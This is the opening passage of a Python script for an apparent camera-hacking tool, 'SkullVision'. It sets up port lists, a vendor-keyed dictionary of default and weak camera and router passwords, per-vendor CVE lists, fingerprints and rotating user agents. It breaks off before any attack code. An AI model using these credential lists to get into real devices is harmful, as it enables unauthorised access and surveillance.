#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re
import time
import json
import socket
import threading
import subprocess
import ipaddress
import base64
import hashlib
import hmac
import binascii
import struct
import zlib
import gzip
import io
import tempfile
import shutil
import pickle
import ast
import codecs
import string as str_lib
import itertools
import secrets
import random
import warnings
import logging
import signal
import queue
import csv
import sqlite3
import configparser
import argparse
import urllib.parse
import xml.etree.ElementTree as ET
import xml.dom.minidom
from collections import defaultdict, OrderedDict, Counter, deque
from datetime import datetime, timedelta, timezone
import concurrent.futures
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Any, Tuple, Set, Union, Callable, Generator, TypeVar, Generic, Iterable, Mapping, Sequence
from enum import IntEnum, Enum, auto
from pathlib import Path
from types import SimpleNamespace, ModuleType, MethodType
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode
from urllib.request import Request, urlopen, build_opener, install_opener, ProxyHandler, HTTPHandler, HTTPSHandler
import math
import traceback
import gc
import ssl
import http.client
import http.cookiejar
from xml.sax.saxutils import escape as xml_escape
from xml.sax.saxutils import unescape as xml_unescape

import telnetlib
import ftplib
import smtplib
import imaplib
import poplib
import platform
import netifaces
import psutil
import resource

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    from requests.auth import HTTPBasicAuth, HTTPDigestAuth
    from requests.cookies import RequestsCookieJar
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    from bs4.element import Comment, Tag, NavigableString
    from bs4 import SoupStrainer
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False

try:
    from Cryptodome.Cipher import AES, DES, DES3, ARC4, PKCS1_OAEP, PKCS1_v1_5
    from Cryptodome.PublicKey import RSA, DSA, ECC, ElGamal
    from Cryptodome.Hash import SHA256, SHA512, MD5, SHA1, SHA224, SHA384
    from Cryptodome.Signature import pkcs1_15, pss, dss
    from Cryptodome.Util.Padding import pad, unpad
    from Cryptodome.Random import get_random_bytes
    from Cryptodome.Protocol.KDF import PBKDF2, scrypt, bcrypt
    from Cryptodome.Cipher import ChaCha20
    from Cryptodome.Util import Counter
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, RSAKey, DSSKey, ECDSAKey, Ed25519Key
    from paramiko import Transport, SFTPClient, SFTP
    from paramiko import AuthenticationException, SSHException
    from paramiko import Agent, AgentKey
    from paramiko import HostKeys
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import pyshark
    from pyshark import LiveCapture, FileCapture, InMemCapture
    PYSHARK_AVAILABLE = True
except ImportError:
    PYSHARK_AVAILABLE = False

try:
    import aiohttp
    import asyncio
    from aiohttp import ClientSession, ClientTimeout, TCPConnector
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

try:
    import nmap
    from nmap import PortScanner, PortScannerAsync
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    import whois
    from whois import whois as whois_query
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import dns.resolver
    import dns.reversename
    import dns.query
    import dns.zone
    import dns.message
    import dns.rdatatype
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from PIL import Image, ImageDraw, ImageFont, ImageFilter, ImageEnhance, ImageOps
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

try:
    import cv2
    import numpy as np
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False

try:
    from rich.console import Console
    from rich.markup import escape
    from rich.status import Status
    from rich.text import Text
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
    from rich.tree import Tree
    from rich.syntax import Syntax
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

try:
    import mysql.connector
    MYSQL_AVAILABLE = True
except ImportError:
    MYSQL_AVAILABLE = False

try:
    import psycopg2
    POSTGRES_AVAILABLE = True
except ImportError:
    POSTGRES_AVAILABLE = False

try:
    import pymongo
    MONGODB_AVAILABLE = True
except ImportError:
    MONGODB_AVAILABLE = False

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False

try:
    import smbclient
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

try:
    from pysnmp.hlapi import *
    SNMP_AVAILABLE = True
except ImportError:
    SNMP_AVAILABLE = False

warnings.filterwarnings("ignore")
if REQUESTS_AVAILABLE:
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("pyshark").setLevel(logging.CRITICAL)

ONVIF_ATTEMPT_TIMEOUT = 5
ONVIF_DISCOVERY_PORT = 3702
ONVIF_MULTICAST_ADDR = "239.255.255.250"

if sys.stdout.isatty():
    R = '\033[31m'; G = '\033[32m'; C = '\033[36m'; W = '\033[0m'
    Y = '\033[33m'; M = '\033[35m'; B = '\033[34m'; BL = '\033[1m'
    UL = '\033[4m'; RED = '\033[91m'; GREEN = '\033[92m'
    YELLOW = '\033[93m'; BLUE = '\033[94m'; MAGENTA = '\033[95m'
    CYAN = '\033[96m'; WHITE = '\033[97m'; BOLD = '\033[1m'
    UNDERLINE = '\033[4m'; RESET = '\033[0m'; ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;206m'; PURPLE = '\033[38;5;129m'; AQUA = '\033[38;5;51m'
    GOLD = '\033[38;5;220m'; SILVER = '\033[38;5;248m'
    BG_RED = '\033[41m'; BG_GREEN = '\033[42m'; BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'; BG_MAGENTA = '\033[45m'; BG_CYAN = '\033[46m'
else:
    R = G = C = W = Y = M = B = BL = UL = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = BOLD = UNDERLINE = RESET = ORANGE = PINK = PURPLE = AQUA = GOLD = SILVER = BG_RED = BG_GREEN = BG_YELLOW = BG_BLUE = BG_MAGENTA = BG_CYAN = ''

VERSION = "3.0.0"
CODENAME = "BLACKOUT"
AUTHOR = "SYLHETYHACKVENGER"
TOOL_NAME = "SkullVision"
MAX_THREADS = 500
PORT_SCAN_TIMEOUT = 0.8
HTTP_TIMEOUT = 3
CREDENTIAL_TIMEOUT = 2
MAX_CREDENTIAL_TIME = 300
BUFFER_SIZE = 8192
MAX_RETRIES = 5
BACKOFF_FACTOR = 0.5

BASE_DIR = Path.home() / ".skullvision"
CACHE_DIR = BASE_DIR / "cache"
RECORDINGS_DIR = BASE_DIR / "recordings"
SNAPSHOTS_DIR = BASE_DIR / "snapshots"
LOGS_DIR = BASE_DIR / "logs"
REPORTS_DIR = BASE_DIR / "reports"
WORDLISTS_DIR = BASE_DIR / "wordlists"
TEMP_DIR = BASE_DIR / "temp"
MODULES_DIR = BASE_DIR / "modules"
PLUGINS_DIR = BASE_DIR / "plugins"
SCRIPTS_DIR = BASE_DIR / "scripts"
CONFIGS_DIR = BASE_DIR / "configs"
DATABASES_DIR = BASE_DIR / "databases"
EXPLOITS_DIR = BASE_DIR / "exploits"
PAYLOADS_DIR = BASE_DIR / "payloads"

COMMON_PORTS = list(dict.fromkeys([
    1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 26, 37, 39, 42, 43, 49,
    50, 51, 53, 54, 55, 56, 57, 58, 59, 63, 65, 67, 68, 69, 70, 71, 72, 73,
    74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91,
    92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107,
    108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122,
    123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137,
    138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152,
    153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,
    168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182,
    183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197,
    198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212,
    213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227,
    228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242,
    243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257,
    258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272,
    273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287,
    288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302,
    303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317,
    318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332,
    333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347,
    348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362,
    363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377,
    378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392,
    393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407,
    408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422,
    423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437,
    438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452,
    453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467,
    468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482,
    483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497,
    498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512,
    513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527,
    528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542,
    543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557,
    558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572,
    573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587,
    588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602,
    603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617,
    618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632,
    633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647,
    648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662,
    663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677,
    678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692,
    693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707,
    708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722,
    723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737,
    738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752,
    753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767,
    768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782,
    783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797,
    798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812,
    813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827,
    828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842,
    843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857,
    858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872,
    873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887,
    888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902,
    903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917,
    918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932,
    933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947,
    948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962,
    963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977,
    978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992,
    993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006,
    1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019,
    1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032,
    1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045,
    1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058,
    1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071,
    1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084,
    1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097,
    1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110,
    1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123,
    1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136,
    1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149,
    1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162,
    1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175,
    1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188,
    1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200
]))

HTTPS_PORTS = [443, 8443, 8444, 8445, 9443, 10443, 11443, 12443, 13443, 14443]
CCTV_PORTS = [80, 443, 554, 8554, 1935, 37777, 3702, 8080, 8443, 8000, 8888]
ONVIF_PORTS = [80, 443, 8080, 8443, 8899, 8890, 8891, 8892, 8893, 8894]
RTSP_PORTS = [554, 8554, 5544, 8555, 10554, 5554, 1554, 7070, 1935, 1936]
SMB_PORTS = [445, 139, 138, 137]
FTP_PORTS = [21, 2121, 2021, 2100, 2101, 2102, 2103, 2104, 2105]
SSH_PORTS = [22, 2222, 2022, 222, 22222, 22022, 2200, 2201, 2202]
SNMP_PORTS = [161, 162, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168]
RDP_PORTS = [3389, 3388, 3390, 3391, 3392, 3393, 3394, 3395, 3396, 3397]
VNC_PORTS = [5900, 5901, 5902, 5903, 5904, 5905, 5906, 5907, 5908, 5909]
MYSQL_PORTS = [3306, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314, 3315]
POSTGRES_PORTS = [5432, 5433, 5434, 5435, 5436, 5437, 5438, 5439, 5440, 5441]
MONGODB_PORTS = [27017, 27018, 27019, 27020, 27021, 27022, 27023, 27024, 27025, 27026]
REDIS_PORTS = [6379, 6380, 6381, 6382, 6383, 6384, 6385, 6386, 6387, 6388]

PORT_SERVICE_MAP = {
    21: ("FTP", "File Transfer Protocol"),
    22: ("SSH", "Secure Shell"),
    23: ("TELNET", "Telnet Remote Access"),
    25: ("SMTP", "Simple Mail Transfer Protocol"),
    53: ("DNS", "Domain Name System"),
    80: ("HTTP", "Hypertext Transfer Protocol"),
    110: ("POP3", "Post Office Protocol v3"),
    111: ("RPC", "Remote Procedure Call"),
    135: ("MSRPC", "Microsoft RPC"),
    137: ("NETBIOS-NS", "NetBIOS Name Service"),
    138: ("NETBIOS-DGM", "NetBIOS Datagram Service"),
    139: ("NETBIOS-SSN", "NetBIOS Session Service"),
    143: ("IMAP", "IMAP Mail Storage"),
    161: ("SNMP", "SNMP Service"),
    162: ("SNMP-TRAP", "SNMP Trap"),
    179: ("BGP", "Border Gateway Protocol"),
    194: ("IRC", "Internet Relay Chat"),
    389: ("LDAP", "Lightweight Directory Access Protocol"),
    443: ("HTTPS", "HTTP Secure"),
    445: ("SMB", "Server Message Block"),
    465: ("SMTP-SSL", "SMTP over SSL"),
    502: ("MODBUS", "Modbus Protocol"),
    512: ("REXEC", "Remote Execution"),
    513: ("LOGIN", "Remote Login"),
    514: ("SHELL", "Remote Shell"),
    515: ("PRINTER", "Line Printer Daemon"),
    520: ("EFS", "Extended File System"),
    543: ("KLOGIN", "Kerberos Login"),
    544: ("KSHELL", "Kerberos Shell"),
    546: ("DHCPV6", "DHCP v6"),
    547: ("DHCPV6", "DHCP v6"),
    548: ("AFP", "Apple File Protocol"),
    554: ("RTSP", "Real Time Streaming Protocol"),
    587: ("SMTP", "SMTP Submission"),
    631: ("IPP", "Internet Printing Protocol"),
    636: ("LDAPS", "LDAP over SSL"),
    873: ("RSYNC", "Rsync Protocol"),
    989: ("FTP-DATA", "FTP Data Transfer"),
    990: ("FTP-SSL", "FTP over SSL"),
    992: ("TELNET-SSL", "Telnet over SSL"),
    993: ("IMAPS", "IMAP over SSL"),
    995: ("POP3S", "POP3 over SSL"),
    3306: ("MYSQL", "MySQL Database"),
    3389: ("RDP", "Remote Desktop Protocol"),
    5432: ("POSTGRESQL", "PostgreSQL Database"),
    5900: ("VNC", "Virtual Network Computing"),
    6379: ("REDIS", "Redis Database"),
    8080: ("HTTP-ALT", "HTTP Alternate"),
    8443: ("HTTPS-ALT", "HTTPS Alternate"),
    27017: ("MONGODB", "MongoDB Database"),
}

CREDENTIALS_DB = {
    "admin": [
        "admin", "1234", "12345", "123456", "1234567", "12345678", "123456789",
        "admin123", "admin1234", "admin12345", "password", "pass", "123", "1111",
        "0000", "8888", "default", "admin@123", "Admin123", "Admin1234",
        "888888", "666666", "4321", "9999", "000000", "111111", "222222",
        "333333", "444444", "555555", "777777", "888888", "999999", "1234567890",
        "qwerty", "abc123", "letmein", "monkey", "dragon", "master", "login",
        "welcome", "password1", "admin1", "administrator", "Admin", "ADMIN",
        "adm1n", "password123", "admin!", "admin@", "root", "toor", "r00t",
        "root123", "qwerty123", "welcome123", "letmein123", "password!",
        "admin123!", "Admin@123", "Password@123", "root@123", "user", "user123",
        "guest", "guest123", "demo", "demo123", "test", "test123"
    ],
    "root": [
        "root", "toor", "1234", "12345", "123456", "pass", "password",
        "root123", "admin", "1111", "0000", "rootroot", "toor123",
        "root1234", "r00t", "r00t123", "p@ssw0rd", "admin123"
    ],
    "user": [
        "user", "user123", "password", "1234", "12345", "123456", "user1",
        "user2", "user3", "test", "test123", "guest", "demo", "demo123"
    ],
    "guest": [
        "guest", "guest123", "1234", "12345", "123456", "guest1",
        "guest2", "guest3", "welcome", "welcome1", "public"
    ],
    "operator": [
        "operator", "operator123", "1234", "12345", "operator12345",
        "op123", "op1", "op2", "op3", "control", "control123"
    ],
    "administrator": [
        "administrator", "admin", "1234", "12345", "123456", "password",
        "admin123", "administrator123", "admin1234", "adm", "adm123"
    ],
    "supervisor": [
        "supervisor", "1234", "12345", "123456", "password", "supervisor123",
        "sup", "sup123", "super", "super123"
    ],
    "support": [
        "support", "support123", "1234", "password", "support1234",
        "help", "help123", "tech", "tech123", "service", "service123"
    ],
    "system": [
        "system", "system123", "1234", "12345", "123456", "systemadmin",
        "sys", "sys123", "sysadmin", "sysadmin123"
    ],
    "hikvision": [
        "admin", "12345", "123456", "admin123", "hik123", "hik456",
        "hikvision", "hikvision123", "dvr", "dvr123", "nvr", "nvr123"
    ],
    "dahua": [
        "admin", "admin123", "dahua", "dahua123", "dvr", "dvr123",
        "nvr", "nvr123", "888888", "666666", "123456"
    ],
    "axis": [
        "root", "axis", "axis123", "admin", "password", "12345",
        "axisroot", "axisadmin", "security", "security123"
    ],
    "cisco": [
        "cisco", "Cisco", "admin", "password", "12345", "cisco123",
        "enable", "secret", "ciscoenable"
    ],
    "mikrotik": [
        "admin", "", "mikrotik", "Mikrotik", "password", "12345",
        "admin123", "mikrotik123"
    ],
    "ubiquiti": [
        "ubnt", "ubiquiti", "Ubiquiti", "admin", "password", "12345",
        "ubnt123", "ubiquiti123"
    ],
    "netgear": [
        "admin", "password", "12345", "netgear", "Netgear", "admin123",
        "password123", "adminnetgear"
    ],
    "dlink": [
        "admin", "admin123", "password", "12345", "dlink", "DLink",
        "admin@123", "Password@123"
    ],
    "tplink": [
        "admin", "admin123", "password", "12345", "tplink", "TPLink",
        "admin@123", "Password@123"
    ]
}

CVE_DATABASE = {
    "hikvision": {
        "cves": [
            "CVE-2024-32760", "CVE-2023-45790", "CVE-2021-36260", "CVE-2017-7921",
            "CVE-2021-31955", "CVE-2021-31956", "CVE-2021-31957", "CVE-2021-31958"
        ],
        "severity": {
            "CVE-2024-32760": "critical",
            "CVE-2023-45790": "high",
            "CVE-2021-36260": "critical",
            "CVE-2017-7921": "high"
        }
    },
    "dahua": {
        "cves": [
            "CVE-2024-26581", "CVE-2022-30563", "CVE-2021-33044", "CVE-2021-33045",
            "CVE-2021-33046", "CVE-2021-33047", "CVE-2021-33048", "CVE-2021-33049"
        ],
        "severity": {
            "CVE-2024-26581": "high",
            "CVE-2022-30563": "medium",
            "CVE-2021-33044": "critical",
            "CVE-2021-33045": "high"
        }
    },
    "axis": {
        "cves": [
            "CVE-2024-24802", "CVE-2020-29550", "CVE-2020-29551", "CVE-2020-29552",
            "CVE-2020-29553", "CVE-2020-29554", "CVE-2020-29555", "CVE-2020-29556"
        ],
        "severity": {
            "CVE-2024-24802": "critical",
            "CVE-2020-29550": "high",
            "CVE-2020-29551": "medium"
        }
    },
    "cisco": {
        "cves": [
            "CVE-2024-20399", "CVE-2023-20269", "CVE-2022-20821", "CVE-2021-1609",
            "CVE-2020-3452", "CVE-2019-12643", "CVE-2018-15473", "CVE-2017-3881"
        ],
        "severity": {
            "CVE-2024-20399": "critical",
            "CVE-2023-20269": "high",
            "CVE-2022-20821": "medium"
        }
    }
}

CAMERA_SERVERS = {
    'hikvision': ['hikvision', 'dvr', 'nvr', 'Hikvision', '/ISAPI/', 'DS-2', 'iDS', 'hik', 'Hik'],
    'dahua': ['dahua', 'dvr', 'nvr', 'Dahua', 'magicBox.cgi', 'IPC-HFW', 'NVR5', 'DahuaDVR'],
    'axis': ['axis', 'axis communications', 'Axis', 'axis-cgi', 'AXIS M10', 'AXIS P13', 'AXIS Q'],
    'sony': ['sony', 'ipela', 'Sony', 'SNC-', 'SNC-R', 'SNC-V', 'ipela'],
    'bosch': ['bosch', 'security systems', 'Bosch', 'DINION', 'AUTODOME', 'VIP', 'VJT'],
    'samsung': ['samsung', 'samsung techwin', 'Samsung', 'SCB-', 'SND-', 'SNV-', 'SDC-'],
    'panasonic': ['panasonic', 'network camera', 'Panasonic', 'WV-', 'BB-HCM', 'WV-S', 'WV-N'],
    'vivotek': ['vivotek', 'network camera', 'Vivotek', 'IP816', 'FD816', 'SD8', 'PTZ'],
    'dlink': ['dlink', 'dlinkcamera', 'dlinksecurity', 'DCS-', 'D-Link'],
    'tplink': ['tplink', 'tplinkcamera', 'tplinksecurity', 'TL-', 'TP-Link'],
    'generic': ['camera', 'webcam', 'surveillance', 'ip camera', 'network camera', 'live', 'stream']
}

CAMERA_CONTENT_TYPES = [
    'image/jpeg', 'image/mjpeg', 'video/mpeg', 'video/mp4', 'video/h264',
    'application/x-mpegURL', 'video/MP2T', 'video/webm', 'video/ogg',
    'video/quicktime', 'video/x-flv', 'video/x-msvideo', 'video/mp2t'
]

COUNTRIES = [
    "US", "JP", "IT", "KR", "FR", "DE", "TW", "RU", "GB", "NL",
    "CZ", "TR", "AT", "CH", "ES", "CA", "SE", "IL", "PL", "IR",
    "NO", "RO", "IN", "VN", "BE", "BR", "BG", "ID", "DK", "AR",
    "MX", "FI", "CN", "CL", "ZA", "SK", "HU", "IE", "EG", "TH",
    "UA", "RS", "HK", "GR", "PT", "LV", "SG", "IS", "MY", "CO",
    "TN", "EE", "DO", "SI", "EC", "LT", "PS", "NZ", "BD", "PA",
    "MD", "NI", "MT", "TT", "SA", "HR", "CY", "PK", "AE", "KZ"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

BANNER = f"""
{R}                                ,@$$$$$.
{R}                              .,$$$$$$$$i
{R}                        .,z$\\"\\")$$$$$$$$C`^#`-..
{R}                     ,zF'        `\\"\\"#*\\"'       \\"*o.
{R}                  ,zXe>        u:..        ..      \\"c
{R}                ,' zP'    ,:`\\"          .            \\"N.
{R}              ,d\\",d$   ,'\\"   ,uB\\" .,uee..,?R.  ,  .    ^$.
{R}            ,@P d$\\"     .:$$$$$$$$$$$$$@$CJN.,\\"    `     #b
{R}           z$\\" d$P    :SM$$$$$$$$$$$$$$$$$Nf.           ^$.
{R}          J$\\" J$P  , ,@$$$$$$$$$$$$$$$$$$$$$$$k.         \\"$r
{R}         z$   $$.   ,$$$$$$$$$$$$$$$$$$$$$$$$f'   .    .   $b
{R}        ,$\\"  $$u,-.x'^\\"\\"$$$$$$$$$$$$$$$$$$$$$.        `.  $k
{R}        $\\"  :$$$$> 8.   `#$$$$$$$$$$$$$$$$$$$\\"\\\\  d  .    F   $.
{R}       $P  .$$$$$N `$b.  $$$$$$$$$$$$$$$$$$$k.$  $\"  :   '   `$
{R}      <$'  4$$k $$c `*$.,Q$$$$$$$$$$$$$$$$$$$$$ ..            $L
{R}      $P   4$$$$$F:   `\\"$$$$$$$$$$$$$$$$$$$$'`$\\"     .   ,    `$
{R}     ,$'  ,$$$$$d$$    '##$$c3$$$$$$$$$$$$$$$. '      :   L.    $.
{R}     J$  u$$$$$$$$$.,oed$*$$$$N \\"#$$$$$$$$$$***$@$N. , $  ,B$$N.,9L
{R}     $F,$$$$$$$$$$,@*\\"'  `J$$$$$#h$$$$$$P\\"`     `\\"*$$. $4W$' \\"$$uJF
{R}     4$$$$$$$$$$$$F'      $*'`$$RR@$$$$$R        ,' \\"$d$4\\"    '$$$R
{R}    ,$$$$$$$$$$$$$F     ,'    @$.3$$$$ R>            `$F$  dN.4$$$$.
{R}   :$$$$$$$$$$$$*$\\"          J$'$$$$$& $.             $'   $$$$$$$$$o
{R}    ^$$$$$$$$$$$$B@$$          $P $$$\\"?N/$k             $r   $$P\\"*$$$$'
{R}      $$i  .$$$$\\"$'         $$ ~R$P '$k^$$,'          $   \\"'  ,d$$'
{R}      $$$$ J$$$$ `,'    .,z$P'd.$P   #$. #$$$u.       .$  eu. ,d$$$
{R}      $^$$$$$$$$. `\\"=+=N#'.,d$M$$'   `$$@s.#$$$u.   ,$C  $$$@$$$\\"$
{R}      \\"  `*$$$$$$bx..        ,M$\\"     `*$$$b/\\"\\"$R\\"*\\"'d$ ,$$$$P\\"  '
{R}      4     \\"$$k3$9$$B.e.  ,ud$F       `3$$$$b.      ,$,@R$*'    4
{R}      <       *$$$$$$$b$$@$$$$$L   ,.  ,J$$.'**$$k$NX$\\"M\\"'       .
